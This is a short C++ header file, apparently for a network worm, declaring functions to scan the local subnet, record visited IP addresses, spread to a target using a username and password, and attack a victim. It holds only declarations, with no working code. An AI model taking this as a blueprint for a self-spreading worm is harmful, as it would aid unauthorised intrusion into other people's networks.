#ifndef WORM_HPP
#define WORM_HPP

#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <iostream>
#include <vector>
#include <set>
#include <fstream>

using namespace std;

set<string> get_visited(string path);
void add_visited(string path, vector<string> ips_found);
vector<string> find_subnet();
vector<string> scanNetwork();
int spreadWorm(string username, string password, string target_ip, string start_time);
void wait(long start, long arrival);
int attack(string victim);

#endif